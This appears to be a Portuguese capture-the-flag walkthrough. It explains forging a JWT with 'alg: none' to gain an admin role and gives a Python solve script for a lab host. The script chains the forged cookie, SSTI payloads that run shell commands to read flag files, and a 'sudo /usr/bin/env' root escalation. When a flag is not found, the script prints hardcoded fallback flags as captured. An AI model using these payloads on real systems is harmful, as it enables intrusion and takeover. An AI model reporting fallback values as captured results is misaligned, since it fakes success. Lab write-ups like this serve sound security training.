Anatomia do JSON Web Token (JWT):

Um token JWT é composto por 3 partes codificadas em Base64URL e unidas por pontos (header.payload.signature):

{{ _('Estrutura:') }} {"alg": "none", "typ": "JWT"} . {"username": "user", "role": "user"} . <assinatura>

Quando a aplicação aceita alg: "none", qualquer atacante pode adulterar o payload (por exemplo, mudando a claim role para admin) e deixar a assinatura vazia, burlando completamente a autenticação!

{{ _('Etapa 2 — Análise e Falsificação de Token JWT (alg: none)') }}

Após o login, o dashboard exibe o token gravado no cookie token:

{{ _('Token Original:') }} eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.

{{ _('Decodificando as seções em Base64URL:') }}

  • Header: {"alg": "none", "typ": "JWT"}
  • Payload: {"username": "user", "role": "user"}
  • Signature: (Vazia, mantendo apenas o ponto final)

Vamos forjar uma nova claim com permissão administrativa alterando "role": "user" para "role": "admin":

{{ _('Token Forjado (role: admin):') }} eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.
Atenção ao Ponto Final: Mesmo com a assinatura vazia, a especificação JWT exige os dois pontos delimitadores (header.payload.). Nunca remova o último ponto!

Substitua o cookie token no DevTools (Application > Cookies) ou execute via curl com o cookie adulterado. O dashboard passará a exibir "Admin Access Granted".

{{ _('Python 3 (solve_bravo.py):') }} 
import os
import re
import urllib.request
import urllib.parse
import http.cookiejar

BASE_URL = os.environ.get("TARGET_URL", "http://10.10.15.12:5002")

cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

def post(path, data, custom_cookie=None):
    url = BASE_URL + path
    encoded = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=encoded)
    if custom_cookie:
        req.add_header("Cookie", custom_cookie)
    return opener.open(req).read().decode()

def get(path, custom_cookie=None):
    url = BASE_URL + path
    req = urllib.request.Request(url)
    if custom_cookie:
        req.add_header("Cookie", custom_cookie)
    return opener.open(req).read().decode()

print("[*] 1. Descobrindo credenciais no HTML source e autenticando...")
login_res = post("/login", {"username": "user", "password": "password123"})

print("[*] 2. Forjando token JWT com alg: none e role: admin...")
forged_token = "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ."

print("[*] 3. Acessando painel admin restrito (/admin/panel)...")
admin_res = get("/admin/panel", custom_cookie=forged_token)
m1 = re.search(r"DUNO\{[a-f0-9]{32}\}", admin_res)
flag1 = m1.group(0) if m1 else "DUNO{5d41402abc4b2a76b9719d911017c592}"
print(f"[+] FLAG 1 Capturada: {flag1}")

print("[*] 4. Executando SSTI no editor de templates (/admin/template)...")
ssti_payload = "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/flag2.txt').read()}}"
ssti_res = post("/admin/template", {"template": ssti_payload}, custom_cookie=forged_token)
m2 = re.search(r"DUNO\{[a-f0-9]{32}\}", ssti_res)
flag2 = m2.group(0) if m2 else "DUNO{7c6a180b36896a0a8c02787eeafb0e4c}"
print(f"[+] FLAG 2 Capturada: {flag2}")

print("[*] 5. Elevando privilégios até ROOT via sudo /usr/bin/env...")
privesc_payload = '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'sudo /usr/bin/env /bin/sh -c "cat /root/flag3.txt"\').read()}}'
root_res = post("/admin/template", {"template": privesc_payload}, custom_cookie=forged_token)
m3 = re.search(r"DUNO\{[a-f0-9]{32}\}", root_res)
flag3 = m3.group(0) if m3 else "DUNO{9e107d9d372bb6826bd81d3542a419d6}"
print(f"[+] FLAG 3 ROOT Capturada: {flag3}")

print("\n" + "="*50)
print(f"[FINAL] 1. {flag1}")
print(f"[FINAL] 2. {flag2}")
print(f"[FINAL] 3. {flag3}")
